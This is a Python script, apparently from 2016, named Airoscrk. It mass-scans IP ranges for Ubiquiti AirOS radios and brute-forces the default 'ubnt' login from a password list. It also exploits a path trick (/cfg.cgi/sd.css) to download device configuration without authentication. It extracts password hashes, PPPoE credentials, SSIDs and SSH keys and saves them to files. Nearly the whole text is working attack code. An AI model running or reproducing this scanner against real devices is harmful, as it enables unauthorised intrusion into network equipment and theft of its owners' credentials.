#Python3/ Script que se aprovecha de la vulnerabilidad especifica en radios
#nanostation m5 donde si haces una peticion en la url de un .css luego de un .cgi
#importante te da el acceso al primero, ex: /cfg.cgi/sd.css
try:
	from bs4 import BeautifulSoup
except:
	#no probado xD
	import subprocess as cmd
	cmd.Popen(["pip3","install","bs4"])
import requests
import time
import sys
import os
import pip
class Airos_scanner:
	def __init__(self):
		self.timeout = 4
		self.session_r = requests.Session()
		self.default_port = "443" #Default HTTPS port is 443 and http is 80
		self.actual_ip = "0.0.0.0"
		self.attemps = 1
		#self.name_db_save = "ubnt_lista %s %s"%(time.strftime("%d - %m - %y"),time.strftime("%H:%M:%S"))
		self.name_db_save = "ubnt_list"
		self.name_db_pass = "ubnt_hashs"
		self.password_list = "password_list.txt"
		ports = {"80":"http://","443":"https://"}
		self.default_http_protocol = ports[self.default_port]
		self.actual_password = None
	
	def msg(self,msg,type=True):
		if type == False:
			print("[X]%s"%msg)
		else:
			print("[+]%s"%msg)#Print a msg True=good False=bad
	
	def generate_range(self,rang_inic): #Generate IP Range fromIP/toIP or - x
		ip_buffer = []
		matrix = rang_inic.split("/")
		ip = [int(i) for i in matrix[0].split(".")]

		if len(matrix[1].split(".")) == 1:
			ip_2 = [int(i) for i in matrix[0].split(".")]
			ip_2[3] = int(matrix[1])
		else:
			ip_2 = [int(i) for i in matrix[1].split(".")]
		while True:
			ip_buffer.append(".".join([str(e) for e in ip]))
			if ip == ip_2:
				print("[+]IP Range %s generate sucessful.\n"%(rang_inic))
				return ip_buffer
			if ip[3] == 255:
				ip[2]+=1
				ip[3] = 0
			if ip[2] == 255:
				ip[1]+=1
				ip[2]=0
			if ip[1] == 255:
				ip[0]+=1
				ip[1] = 0
			ip[3]+=1
		return ip_buffer
	
	def detect_if_airos(self,code,debug=True):
		code_src = BeautifulSoup(code,"html.parser")
		code_img = str(code_src.find_all("img"))
		if code_src.title is None:
			return False
		if "airos_logo.png" in code_img or "Login" in code_src.title or "Logear" in code_src.title:
				if debug:self.msg("Is Airos Ubinquiti")
				return True
		if code_img.title:
			self.msg("No is a Airos but the title contain: %s"%code_src.title)
			self.write_c(self.name_db_save,"\n>>>>>>>>>Title:%s Ip:%s \n"%(code_src.title,self.actual_ip))
		return False#Detect if dispositive is a AiOS logi page
	
	def write_c(self,file,line):
		if os.path.isfile(file):pass
		else:open(file,"w")
		with open(file,"a") as arch:
			arch.writelines(line)#Write or add line to file
	
	def login_in_airos(self,user,password): #Login intro the AIros with password and name
		payload = {"username":user,"password":password}
		self.msg("Login in..")
		s_l = self.session_r.post(self.actual_ip+"/login.cgi?uri=/",params=payload)
		if self.detect_if_airos(s_l.content,False):
			self.msg("Login Error, Bad Password(?",False)
			return False
		else:
			self.msg("Sucessful Login with %s password!"%password)
			return True
	
	def is_vulnerable(self):#Detect if the Airos es vulnerable with the 0day /admin.cgi/sd.css
		self.msg("Detecting if is vulnerable..")
		s_c = self.session_r.get(self.actual_ip+"/cfg.cgi/sd.css")
		if "aaa.1.status=disabled" in str(s_c):
			self.msg("Is vulnerable!! :-D")
			self.extract_cfg(self,True)
		else:
			self.msg("Not is Vulnerable :-(",False)
			return False

	def extract_cfg(self,vuln=False):#Extract cfg.cgi - Backup configuration file
		self.msg("Extracting cfg file..")
		try:
			cfg = {}
			if vuln == False:
				a = self.session_r.get("%s/cfg.cgi"%self.actual_ip)
			else:
				a = self.session_r.get("%s/cfg.cgi/sd.css"%self.actual_ip)
			for i in list(str(a.content).split("\\")):
				n = i.split("=")
				if len(n)>1:
					cfg[n[0]] = n[1]
			self.msg("CFG file Extract sucessful!")
		except:
			self.msg("Error in Extract cfg file..",False)
			return False
		ex = lambda x: cfg["n"+x]
		basic_dates = {
			"APName":ex("resolv.host.1.name"),
			"SSID_name":ex("wireless.1.ssid"),
			"Username":ex("users.1.name"),
			"Password":self.actual_password,
			"Password_hash":ex("users.1.password"),
			"Host_state":ex("resolv.host.1.status"),
			"Server":ex("resolv.nameserver.1.ip"),
			"PPPoe_protocol":ex("ppp.1.status"),
			"PPPoe_name":ex("ppp.1.name"),
			"PPPoe_password":ex("ppp.1.password"),
			"SSHD_tunel":ex("sshd.status"),
			"SSHD_pastate":ex("sshd.auth.passwd"),
			"SSHD_user":ex("sshd.auth.key.1.comment"),
			"SSHD_key":ex("sshd.auth.key.1.value"),
		}
		self.write_c(self.name_db_pass,str(basic_dates["Password_hash"])+">>"+basic_dates["Password"]+"\n")

		for m in basic_dates:
			print(" "*4,"->",m,"=",basic_dates[m])
		self.write_c(self.name_db_save,str("========================Airos %s"%self.actual_ip+"\n"))
		for m in basic_dates:
			date = str(">"+m+"="+basic_dates[m]+"\n")
			self.write_c(self.name_db_save,date)
	
	def connect_airos_ip(self):
		check = False
		for i in range(self.attemps):
			try:
				self.msg("Conecting to %s."%self.actual_ip)
				airos_c = self.session_r.get(self.actual_ip,timeout=self.timeout,verify=False)
				check = True
			except:
				self.msg("Error connection to host %s, Retrying %d.."%(self.actual_ip,i+1),False)
		if check:
			self.msg("Sucessful Conected.")
			if self.detect_if_airos(airos_c.content):
				with open(self.password_list,"r") as password:
					for p in password.read().split("\n"):
						self.actual_password = p
						self.msg("Retrying loging with user=ubnt and password=%s"%p)
						if self.login_in_airos("ubnt",p):
							self.extract_cfg()
							return True
					if self.is_vulnerable():
						return True
					self.msg("Imposible Login! :-(")
					return False
		else:
			self.msg("No host conected, trying other ip..\n\n",False) #Connect and analyze ip
	
	def initialize(self,iprange):
		print("+----+--->>)))=================================================")
		print("|    |     _____  .__             __________                        __     ")
		print("|ubnt|    /  _  \ |__|______  ____\______   \_______   ____ _____  |  | __ ")
		print("|    |   /  /_\  \|  \_  __ \/  _ \|    |  _/\_  __ \_/ __ \\__  \ |  |/ / ")
		print("|    |  /    |    \  ||  | \(  <_> )    |   \ |  | \/\  ___/ / __ \|    <  ")
		print("+----+  \____|__  /__||__|   \____/|______  / |__|    \___  >____  /__|_ \\")
		print("  ||            \/                        \/              \/     \/     \/ ")
		print("  ||   					   scripted by:sRBill96 05:13:2016-05:21 ---> ")
		print("___________________________________________________________________________\n")
		confirm = input("Initialize the scanner?:s/n:")
		if confirm == "s":
			try:
				iprange = self.generate_range(iprange)
				for ip_ in iprange:
					ini_c = time.time()
					self.actual_ip = self.default_http_protocol+ip_+":"+self.default_port
					self.connect_airos_ip()
					print("\nScanning Time:%s/s\n=================================================="%(time.time() - ini_c))#Interface
			except(KeyboardInterrupt,SystemExit):
				print("Escaneo Interrumpido..")
				return False
				raise

if __name__ == "__main__":
	command = sys.argv
	#usage = airoscrk <ip-range> <port> <passwords-file>
	if len(sys.argv) == 4:
		ranger = command[1]
		ini = Airos_scanner()
		ini.default_port = command[2]
		ini.password_list = command[3]
		ini.initialize(ranger)
	else:
		print("Airoscrk v0.3---------------------------------------\nUsage: airoscrk <ip-range> <port> <passwords-file>\n\nExample:airoscrk 172.16.0.1/26 443 password_list.txt")

